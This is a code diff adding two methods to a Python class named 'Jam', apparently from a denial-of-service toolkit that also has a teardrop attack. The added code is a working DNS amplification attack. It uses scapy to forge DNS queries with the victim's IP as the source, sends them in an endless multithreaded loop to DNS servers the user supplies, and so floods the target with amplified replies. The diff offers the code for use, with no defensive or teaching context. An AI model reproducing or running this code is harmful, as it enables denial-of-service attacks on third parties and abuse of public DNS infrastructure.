@@ -138,7 +138,36 @@ class Jam(object):
 		except Exception as e:
 			print "[!] Error: {}".format(e)
 
+	def dnsamplificationstart(self, tgt):
+		self.tgt = tgt
+		dns = raw_input("[+] DNS Servers to use in amplification attack(separated by commas): ")
+		self.dnsservers = []
+		for s in dns.split(","):
+			self.dnsservers.append(s)
+		try:
+			print "[+] DNS Amplification denial of service initialized."
+			for x in range(0,3):
+				i = threading.Thread(name="dnsamp",target=self.dnsamplification)
+				i.setDaemon(True)
+				i.start()
+			self.dnsamplification()
+		except KeyboardInterrupt:
+			print "[-] DNS Amplification denial of server finalized."
+			exit(0)
+		except Exception as e:
+			print "[!] Exception caught: {}".format(e)
 
+	def dnsamplification(self):
+		try:
+
+			while True:
+				for server in self.dnsservers:
+					pkt = IP(dst=server, src=self.tgt)/\
+						UDP(dport=53, sport=RandNum(1024,65535))/\
+						DNS(rd=1,qd=DNSQR(qname="www.google.com"))
+					send(pkt, inter=0.0, verbose=False)
+		except Exception as e:
+			print "[!] Error: {}".format(e)
 
 	def teardrop(self,target):
 			#First packet
